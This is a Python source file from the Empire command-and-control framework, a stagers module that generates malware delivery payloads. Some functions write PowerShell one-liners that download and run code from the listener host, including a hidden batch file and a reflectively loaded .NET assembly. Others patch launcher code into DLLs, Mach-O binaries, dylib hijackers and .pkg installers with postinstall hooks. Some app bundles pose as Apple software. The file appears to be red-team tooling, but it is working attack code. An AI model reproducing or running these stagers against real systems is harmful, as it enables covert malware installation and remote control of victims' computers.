"""

Functionality that loads Empire stagers, sets generic stager options,
and abstracts the invocation of launcher generation.

The Stagers() class in instantiated in ./server.py by the main menu and includes:

    generate_launcher() - abstracted functionality that invokes the generate_launcher() method for a given listener
    generate_dll() - generates a PowerPick Reflective DLL to inject with base64-encoded stager code
    generate_macho() - generates a macho binary with an embedded python interpreter that runs the launcher code
    generate_dylib() - generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application

"""

import base64
import errno
import logging
import os
import shutil
import string
import subprocess
import zipfile
from itertools import cycle

try:
    import donut
except ModuleNotFoundError:
    donut = None

import macholib.MachO

from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.utils import data_util
from empire.server.utils.math_util import old_div

from . import helpers

log = logging.getLogger(__name__)


class Stagers:
    def __init__(self, MainMenu, args):
        self.mainMenu = MainMenu
        self.args = args

    def generate_launcher_fetcher(
        self,
        language=None,
        encode=True,
        webFile="http://127.0.0.1/launcher.bat",
        launcher="powershell -noP -sta -w 1 -enc ",
    ):
        # TODO add handle for other than powershell language
        stager = (
            'wget "'
            + webFile
            + r'" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
        )
        if encode:
            return helpers.powershell_launcher(stager, launcher)

        return stager

    def generate_launcher(  # noqa: PLR0913
        self,
        listenerName,
        language=None,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        safeChecks="true",
        bypasses: str = "",
    ):
        """
        Abstracted functionality that invokes the generate_launcher() method for a given listener,
        if it exists.
        """
        with SessionLocal.begin() as db:
            bypasses_parsed = []
            for bypass in bypasses.split(" "):
                db_bypass = (
                    db.query(models.Bypass).filter(models.Bypass.name == bypass).first()
                )
                if db_bypass:
                    if db_bypass.language == language:
                        bypasses_parsed.append(db_bypass.code)
                    else:
                        log.warning(f"Invalid bypass language: {db_bypass.language}")

            db_listener = self.mainMenu.listenersv2.get_by_name(db, listenerName)
            active_listener = self.mainMenu.listenersv2.get_active_listener(
                db_listener.id
            )
            if not active_listener:
                log.error(f"Invalid listener: {listenerName}")
                return ""

            launcher_code = active_listener.generate_launcher(
                encode=encode,
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
                userAgent=userAgent,
                proxy=proxy,
                proxyCreds=proxyCreds,
                stagerRetries=stagerRetries,
                language=language,
                listenerName=listenerName,
                safeChecks=safeChecks,
                bypasses=bypasses_parsed,
            )
            if launcher_code:
                return launcher_code
            return None

    def generate_dll(self, poshCode, arch):
        """
        Generate a PowerPick Reflective DLL to inject with base64-encoded stager code.
        """

        # read in original DLL and patch the bytes based on arch
        if arch.lower() == "x86":
            origPath = (
                f"{self.mainMenu.installPath}/data/misc/ReflectivePick_x86_orig.dll"
            )
        else:
            origPath = (
                f"{self.mainMenu.installPath}/data/misc/ReflectivePick_x64_orig.dll"
            )

        if os.path.isfile(origPath):
            dllRaw = ""
            with open(origPath, "rb") as f:
                dllRaw = f.read()

                replacementCode = helpers.decode_base64(poshCode)

                # patch the dll with the new PowerShell code
                searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
                index = dllRaw.find(searchString)
                return (
                    dllRaw[:index]
                    + replacementCode
                    + dllRaw[(index + len(replacementCode)) :]
                )

        else:
            log.error(f"Original .dll for arch {arch} does not exist!")
            return None

    def generate_powershell_exe(
        self, posh_code, dot_net_version="net40", obfuscate=False
    ):
        """
        Generate powershell launcher embedded in csharp
        """
        with open(self.mainMenu.installPath + "/stagers/CSharpPS.yaml", "rb") as f:
            stager_yaml = f.read()
        stager_yaml = stager_yaml.decode("UTF-8")

        # Write text file to resources to be embedded
        with open(
            self.mainMenu.installPath
            + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
            "w",
        ) as f:
            f.write(posh_code)

        compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
        if compiler.status != "ON":
            log.error("csharpserver plugin not running")
        else:
            file_name = compiler.do_send_stager(
                stager_yaml, "CSharpPS", confuse=obfuscate
            )

        return f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"

    def generate_powershell_shellcode(
        self, posh_code, arch="both", dot_net_version="net40"
    ) -> tuple[str | None, str | None]:
        """
        Generate powershell shellcode using donut python module
        """
        if arch == "x86":
            arch_type = 1
        elif arch == "x64":
            arch_type = 2
        elif arch == "both":
            arch_type = 3

        directory = self.generate_powershell_exe(posh_code, dot_net_version)

        if not donut:
            err = "module donut-shellcode not installed. It is only supported on x86."
            log.warning(err, exc_info=True)
            return None, err

        shellcode = donut.create(file=directory, arch=arch_type)
        return shellcode, None

    def generate_exe_oneliner(
        self, language, obfuscate, obfuscation_command, encode, listener_name
    ):
        """
        Generate a oneliner for a executable
        """
        listener = self.mainMenu.listenersv2.get_active_listener_by_name(listener_name)

        if getattr(listener, "parent_listener", None) is not None:
            hop = listener.options["Name"]["Value"]
            while getattr(listener, "parent_listener", None) is not None:
                listener = self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener.parent_listener.name
                )
        else:
            hop = ""
        host = listener.options["Host"]["Value"]
        launcher_front = listener.options["Launcher"]["Value"]

        # Encoded launcher requires a sleep
        launcher = f"""
        $wc=New-Object System.Net.WebClient;
        $bytes=$wc.DownloadData("{host}/download/{language}/{hop}");
        $assembly=[Reflection.Assembly]::load($bytes);
        $assembly.GetType("Program").GetMethod("Main").Invoke($null, $null);
        """

        # Remove comments and make one line
        launcher = helpers.strip_powershell_comments(launcher)
        launcher = data_util.ps_convert_to_oneliner(launcher)

        if obfuscate:
            launcher = self.mainMenu.obfuscationv2.obfuscate(
                launcher,
                obfuscation_command=obfuscation_command,
            )
        # base64 encode the stager and return it
        if encode and (
            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
        ):
            return helpers.powershell_launcher(launcher, launcher_front)
        # otherwise return the case-randomized stager
        return launcher

    def generate_python_exe(
        self, python_code, dot_net_version="net40", obfuscate=False
    ):
        """
        Generate ironpython launcher embedded in csharp
        """
        with open(self.mainMenu.installPath + "/stagers/CSharpPy.yaml", "rb") as f:
            stager_yaml = f.read()
        stager_yaml = stager_yaml.decode("UTF-8")

        # Write text file to resources to be embedded
        with open(
            self.mainMenu.installPath
            + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
            "w",
        ) as f:
            f.write(python_code)

        compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
        if compiler.status != "ON":
            log.error("csharpserver plugin not running")
        else:
            file_name = compiler.do_send_stager(
                stager_yaml, "CSharpPy", confuse=obfuscate
            )

        return f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"

    def generate_python_shellcode(
        self, posh_code, arch="both", dot_net_version="net40"
    ) -> tuple[str | None, str | None]:
        """
        Generate ironpython shellcode using donut python module
        """
        if arch == "x86":
            arch_type = 1
        elif arch == "x64":
            arch_type = 2
        elif arch == "both":
            arch_type = 3

        if not donut:
            err = "module donut-shellcode not installed. It is only supported on x86."
            log.warning(err, exc_info=True)
            return None, err

        directory = self.generate_python_exe(posh_code, dot_net_version)
        shellcode = donut.create(file=directory, arch=arch_type)
        return shellcode, None

    def generate_macho(self, launcherCode):
        """
        Generates a macho binary with an embedded python interpreter that runs the launcher code.
        """

        MH_EXECUTE = 2
        # with open(self.installPath + "/data/misc/machotemplate", 'rb') as f:
        with open(f"{self.mainMenu.installPath}/data/misc/machotemplate", "rb") as f:
            macho = macholib.MachO.MachO(f.name)

            if int(macho.headers[0].header.filetype) != MH_EXECUTE:
                log.error("Macho binary template is not the correct filetype")
                return ""

            cmds = macho.headers[0].commands

            for cmd in cmds:
                count = 0
                if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                    count += 1
                    if (
                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
                        and cmd[count].nsects > 0
                    ):
                        count += 1
                        for section in cmd[count]:
                            if section.sectname.strip(b"\x00") == b"__cstring":
                                offset = int(section.offset) + (
                                    int(section.size) - 2119
                                )
                                placeHolderSz = int(section.size) - (
                                    int(section.size) - 2119
                                )

            template = f.read()

        if placeHolderSz and offset:
            key = "subF"
            launcherCode = "".join(
                chr(ord(x) ^ ord(y)) for (x, y) in zip(launcherCode, cycle(key))
            )
            launcherCode = base64.urlsafe_b64encode(launcherCode.encode("utf-8"))
            launcher = launcherCode + b"\x00" * (placeHolderSz - len(launcherCode))
            return template[:offset] + launcher + template[(offset + len(launcher)) :]

        log.error("Unable to patch MachO binary")
        return None

    def generate_dylib(self, launcherCode, arch, hijacker):  # noqa: PLR0912
        """
        Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
        """
        import macholib.MachO

        MH_DYLIB = 6
        if hijacker.lower() == "true":
            if arch == "x86":
                f = f"{self.mainMenu.installPath}/data/misc/hijackers/template.dylib"
            else:
                f = f"{self.mainMenu.installPath}/data/misc/hijackers/template64.dylib"
        elif arch == "x86":
            f = f"{self.mainMenu.installPath}/data/misc/templateLauncher.dylib"
        else:
            f = f"{self.mainMenu.installPath}/data/misc/templateLauncher64.dylib"

        with open(f, "rb") as f:
            macho = macholib.MachO.MachO(f.name)

            if int(macho.headers[0].header.filetype) != MH_DYLIB:
                log.error("Dylib template is not the correct filetype")
                return ""

            cmds = macho.headers[0].commands

            for cmd in cmds:
                count = 0
                if (
                    int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
                    or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
                ):
                    count += 1
                    if (
                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
                        and cmd[count].nsects > 0
                    ):
                        count += 1
                        for section in cmd[count]:
                            if section.sectname.strip(b"\x00") == b"__cstring":
                                offset = int(section.offset)
                                placeHolderSz = int(section.size) - 52
            template = f.read()

        if placeHolderSz and offset:
            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            if isinstance(launcher, str):
                launcher = launcher.encode("UTF-8")
            return b"".join(
                [template[:offset], launcher, template[(offset + len(launcher)) :]]
            )

        log.error("Unable to patch dylib")
        return None

    def generate_appbundle(  # noqa: PLR0915, PLR0912
        self, launcherCode, Arch, icon, AppName, disarm
    ):
        """
        Generates an application. The embedded executable is a macho binary with the python interpreter.
        """
        MH_EXECUTE = 2

        if Arch == "x64":
            f = (
                self.mainMenu.installPath
                + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher"
            )
            directory = (
                self.mainMenu.installPath
                + "/data/misc/apptemplateResources/x64/launcher.app/"
            )
        else:
            f = (
                self.mainMenu.installPath
                + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher"
            )
            directory = (
                self.mainMenu.installPath
                + "/data/misc/apptemplateResources/x86/launcher.app/"
            )

        with open(f, "rb") as f:
            macho = macholib.MachO.MachO(f.name)

            if int(macho.headers[0].header.filetype) != MH_EXECUTE:
                log.error("Macho binary template is not the correct filetype")
                return ""

            cmds = macho.headers[0].commands

            for cmd in cmds:
                count = 0
                if (
                    int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
                    or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
                ):
                    count += 1
                    if (
                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
                        and cmd[count].nsects > 0
                    ):
                        count += 1
                        for section in cmd[count]:
                            if section.sectname.strip(b"\x00") == b"__cstring":
                                offset = int(section.offset)
                                placeHolderSz = int(section.size) - 52

            template = f.read()

        if placeHolderSz and offset:
            launcher = launcherCode.encode("utf-8") + b"\x00" * (
                placeHolderSz - len(launcherCode)
            )
            patchedBinary = (
                template[:offset] + launcher + template[(offset + len(launcher)) :]
            )
            if AppName == "":
                AppName = "launcher"

            tmpdir = f"/tmp/application/{AppName}.app/"
            shutil.copytree(directory, tmpdir)
            with open(tmpdir + "Contents/MacOS/launcher", "wb") as f:
                if disarm is not True:
                    f.write(patchedBinary)
                else:
                    t = (
                        self.mainMenu.installPath
                        + "/data/misc/apptemplateResources/empty/macho"
                    )
                    with open(t, "rb") as t:
                        w = t.read()
                        f.write(w)

            os.rename(
                tmpdir + "Contents/MacOS/launcher",
                tmpdir + f"Contents/MacOS/{AppName}",
            )
            os.chmod(tmpdir + f"Contents/MacOS/{AppName}", 0o755)

            if icon != "":
                iconfile = os.path.splitext(icon)[0].split("/")[-1]
                shutil.copy2(icon, tmpdir + "Contents/Resources/" + iconfile + ".icns")
            else:
                iconfile = icon
            appPlist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>BuildMachineOSBuild</key>
    <string>15G31</string>
    <key>CFBundleDevelopmentRegion</key>
    <string>en</string>
    <key>CFBundleExecutable</key>
    <string>{AppName}</string>
    <key>CFBundleIconFile</key>
    <string>{iconfile}</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.{AppName}</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundleName</key>
    <string>{AppName}</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleSignature</key>
    <string>????</string>
    <key>CFBundleSupportedPlatforms</key>
    <array>
        <string>MacOSX</string>
    </array>
    <key>CFBundleVersion</key>
    <string>1</string>
    <key>DTCompiler</key>
    <string>com.apple.compilers.llvm.clang.1_0</string>
    <key>DTPlatformBuild</key>
    <string>7D1014</string>
    <key>DTPlatformVersion</key>
    <string>GM</string>
    <key>DTSDKBuild</key>
    <string>15E60</string>
    <key>DTSDKName</key>
    <string>macosx10.11</string>
    <key>DTXcode</key>
    <string>0731</string>
    <key>DTXcodeBuild</key>
    <string>7D1014</string>
    <key>LSApplicationCategoryType</key>
    <string>public.app-category.utilities</string>
    <key>LSMinimumSystemVersion</key>
    <string>10.11</string>
    <key>LSUIElement</key>
    <true/>
    <key>NSHumanReadableCopyright</key>
    <string>Copyright 2016 Apple. All rights reserved.</string>
    <key>NSMainNibFile</key>
    <string>MainMenu</string>
    <key>NSPrincipalClass</key>
    <string>NSApplication</string>
</dict>
</plist>
"""
            with open(tmpdir + "Contents/Info.plist", "w") as f:
                f.write(appPlist)

            shutil.make_archive("/tmp/launcher", "zip", "/tmp/application")
            shutil.rmtree("/tmp/application")

            with open("/tmp/launcher.zip", "rb") as f:
                zipbundle = f.read()
            os.remove("/tmp/launcher.zip")
            return zipbundle

        log.error("Unable to patch application")
        return None

    def generate_pkg(self, launcher, bundleZip, AppName):
        # unzip application bundle zip. Copy everything for the installer pkg to a temporary location
        os.chdir("/tmp/")
        with open("app.zip", "wb") as f:
            f.write(bundleZip)
        zipf = zipfile.ZipFile("app.zip", "r")
        zipf.extractall()
        zipf.close()
        os.remove("app.zip")

        os.system("cp -r " + self.mainMenu.installPath + "/data/misc/pkgbuild/ /tmp/")
        os.chdir("pkgbuild")
        os.system("cp -r ../" + AppName + ".app root/Applications/")
        os.system("chmod +x root/Applications/")
        subprocess.call(
            "( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload",
            shell=True,
            stderr=subprocess.DEVNULL,
        )

        os.system("chmod +x expand/Payload")
        with open("scripts/postinstall", "r+") as s:
            script = s.read()
            script = script.replace("LAUNCHER", launcher)
            s.seek(0)
            s.write(script)
        subprocess.call(
            "( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts",
            shell=True,
            stderr=subprocess.DEVNULL,
        )
        os.system("chmod +x expand/Scripts")
        numFiles = subprocess.check_output("find root | wc -l", shell=True).strip(b"\n")
        size = subprocess.check_output("du -b -s root", shell=True).split(b"\t")[0]
        size = old_div(int(size), 1024)
        with open("expand/PackageInfo", "w+") as p:
            pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
    <pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
        <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
        <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
        <bundle-version>
            <bundle id="com.apple.APPNAME"/>
        </bundle-version>
        <upgrade-bundle>
            <bundle id="com.apple.APPNAME"/>
        </upgrade-bundle>
        <update-bundle/>
        <atomic-update-bundle/>
        <strict-identifier>
            <bundle id="com.apple.APPNAME"/>
        </strict-identifier>
        <relocate>
            <bundle id="com.apple.APPNAME"/>
        </relocate>
        <scripts>
            <postinstall file="./postinstall"/>
        </scripts>
    </pkg-info>
    """
            pkginfo = pkginfo.replace("APPNAME", AppName)
            pkginfo = pkginfo.replace("KEY1", numFiles.decode("UTF-8"))
            pkginfo = pkginfo.replace("KEY2", str(size))
            p.write(pkginfo)
        os.system("mkbom -u 0 -g 80 root expand/Bom")
        os.system("chmod +x expand/Bom")
        os.system("chmod -R 755 expand/")
        os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
        with open("launcher.pkg", "rb") as f:
            package = f.read()
        os.chdir("/tmp/")
        shutil.rmtree("pkgbuild")
        shutil.rmtree(AppName + ".app")
        return package

    def generate_jar(self, launcherCode):
        with open(self.mainMenu.installPath + "/data/misc/Run.java") as f:
            javacode = f.read()
        javacode = javacode.replace("LAUNCHER", launcherCode)
        jarpath = self.mainMenu.installPath + "/data/misc/classes/com/installer/apple/"
        try:
            os.makedirs(jarpath)
        except OSError as e:
            if e.errno != errno.EEXIST:
                raise

        with open(jarpath + "Run.java", "w") as f:
            f.write(javacode)
        os.system(
            "javac "
            + self.mainMenu.installPath
            + "/data/misc/classes/com/installer/apple/Run.java"
        )
        os.system(
            "jar -cfe "
            + self.mainMenu.installPath
            + "/data/misc/Run.jar com.installer.apple.Run "
            + self.mainMenu.installPath
            + "/data/misc/classes/com/installer/apple/Run.class"
        )
        os.remove(
            self.mainMenu.installPath
            + "/data/misc/classes/com/installer/apple/Run.class"
        )
        os.remove(
            self.mainMenu.installPath
            + "/data/misc/classes/com/installer/apple/Run.java"
        )
        with open(self.mainMenu.installPath + "/data/misc/Run.jar", "rb") as jarfile:
            jar = jarfile.read()
        os.remove(self.mainMenu.installPath + "/data/misc/Run.jar")

        return jar

    def generate_upload(self, file, path):
        script = """
$b64 = "BASE64_BLOB_GOES_HERE"
$filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
[IO.FILE]::WriteAllBytes($filename, [Convert]::FromBase64String($b64))

"""

        file_encoded = base64.b64encode(file).decode("UTF-8")

        script = script.replace("BASE64_BLOB_GOES_HERE", file_encoded)
        return script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)

    def generate_stageless(self, options):
        listener_name = options["Listener"]["Value"]
        if options["Language"]["Value"] == "ironpython":
            language = "python"
            version = "ironpython"
        else:
            language = options["Language"]["Value"]
            version = ""

        active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
            listener_name
        )

        chars = string.ascii_uppercase + string.digits
        session_id = helpers.random_string(length=8, charset=chars)
        staging_key = active_listener.options["StagingKey"]["Value"]
        delay = active_listener.options["DefaultDelay"]["Value"]
        jitter = active_listener.options["DefaultJitter"]["Value"]
        profile = active_listener.options["DefaultProfile"]["Value"]
        kill_date = active_listener.options["KillDate"]["Value"]
        working_hours = active_listener.options["WorkingHours"]["Value"]
        lost_limit = active_listener.options["DefaultLostLimit"]["Value"]
        if "Host" in active_listener.options:
            host = active_listener.options["Host"]["Value"]
        else:
            host = ""

        with SessionLocal.begin() as db:
            agent = self.mainMenu.agents.add_agent(
                session_id,
                "0.0.0.0",
                delay,
                jitter,
                profile,
                kill_date,
                working_hours,
                lost_limit,
                listener=listener_name,
                language=language,
                db=db,
            )

            # update the agent with this new information
            self.mainMenu.agents.update_agent_sysinfo_db(
                db,
                session_id,
                listener=listener_name,
                internal_ip="0.0.0.0",
                username="blank\\blank",
                hostname="blank",
                os_details="blank",
                high_integrity=0,
                process_name="blank",
                process_id=99999,
                language_version=2,
                language=language,
                architecture="AMD64",
            )

            # Send initial task for sysinfo into the database
            self.mainMenu.agenttasksv2.create_task_sysinfo(db, agent, 0)

            # get the agent's session key
            session_key = agent.session_key

            agent_code = active_listener.generate_agent(
                active_listener.options, language=language, version=version
            )
            comms_code = active_listener.generate_comms(
                active_listener.options, language=language
            )

            stager_code = active_listener.generate_stager(
                active_listener.options, language=language, encrypt=False, encode=False
            )

            if options["Language"]["Value"] == "powershell":
                launch_code = f"\nInvoke-Empire -Servers @('{host}') -StagingKey '{staging_key}' -SessionKey '{session_key}' -SessionID '{session_id}' -WorkingHours '{working_hours}' -KillDate '{kill_date}';"
                return comms_code + "\n" + agent_code + "\n" + launch_code

            if options["Language"]["Value"] in ["python", "ironpython"]:
                stager_code = stager_code.replace(
                    "return b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))",
                    f"return b'{session_id}'",
                )

                stager_code = replace_execute_function(stager_code, session_key)
                launch_code = ""

                if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
                    full_agent = "\n".join(
                        [agent_code, stager_code, comms_code, launch_code]
                    )
                else:
                    full_agent = "\n".join([agent_code, stager_code, launch_code])
                return full_agent
            return None


def replace_execute_function(code, session_key):
    code_first = code.split("def execute(self):")[0]
    code_last = code.split("agent.run()")[1]

    new_function = f"""
    def execute(self):
        self.key = b'{session_key}'
        self.packet_handler.key = self.key
        agent = MainAgent(packet_handler=self.packet_handler, profile=self.profile, server=self.server, session_id=self.session_id, kill_date=self.kill_date, working_hours=self.working_hours)
        self.packet_handler.agent = agent
        agent.run()
"""

    return code_first + new_function + code_last
